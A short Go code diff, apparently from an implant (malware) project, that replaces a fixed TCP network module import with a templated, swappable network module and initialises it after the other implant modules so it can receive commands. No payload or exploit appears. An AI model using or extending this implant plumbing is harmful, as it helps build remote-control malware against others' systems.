@@ -2,8 +2,8 @@ package main
 
 import (
 	"fmt"
-	"malware/implant/basic_tcp_network"
 	"malware/implant/included_modules"
+	network "malware/implant/network_modules/_NETWORK_TYPE_"
 	"os"
 	"os/exec"
 	"os/signal"
@@ -38,5 +38,6 @@ func main() {
 		}
 	}()
 
-	basic_tcp_network.Init() // Network is always last to init (Can't get commands until other modules started)
+	// basic_tcp_network.Init() // Network is always last to init (Can't get commands until other modules started)
+	network.Init()
 }
